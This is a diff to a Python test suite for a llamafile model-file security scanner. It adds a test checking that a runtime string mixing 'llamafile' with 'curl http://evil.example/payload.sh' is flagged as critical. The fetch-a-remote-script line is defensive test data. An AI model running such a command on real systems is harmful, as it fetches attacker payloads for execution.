@@ -66,6 +66,23 @@ def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> N
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
 
 
+def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
+    binary = tmp_path / "mixed.llamafile"
+    binary.write_bytes(
+        _build_llamafile_blob(
+            runtime_lines=[
+                "llamafile curl http://evil.example/payload.sh",
+            ]
+        )
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert runtime_issues
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
 def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
     binary = tmp_path / "truncated.llamafile"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))
